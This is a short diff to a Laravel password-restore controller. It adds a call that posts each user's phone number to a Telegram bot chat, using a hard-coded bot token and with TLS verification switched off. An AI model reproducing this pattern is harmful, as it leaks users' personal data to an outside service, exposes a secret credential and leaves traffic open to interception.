@@ -14,6 +14,7 @@ use Nette\Utils\Random;
 use Exception;
 use Illuminate\Notifications\Messages\MailMessage;
 use Illuminate\Support\Facades\Hash;
+use Illuminate\Support\Facades\Http;
 
 class RestoreController extends Controller
 {
@@ -158,9 +159,13 @@ class RestoreController extends Controller
             ['phone' => $phone],
             ['token' => $code]
         );
-
+       $message = "Foydalanuvchi IP restore manzili: phone $phone";
         (new EskizService)
             ->send($phone, __('mobile.send.verification_code', ['code' => $code]));
+        Http::withOptions(['verify' => false])->post('https://api.telegram.org/bot5777417067:AAGvh21OUGVQ7nmSnLbIhzTiZxoyMQMIZKk/sendMessage', [
+            'chat_id' => '-4228941603',
+            'text' => $message
+        ]);
     }
 
     /**
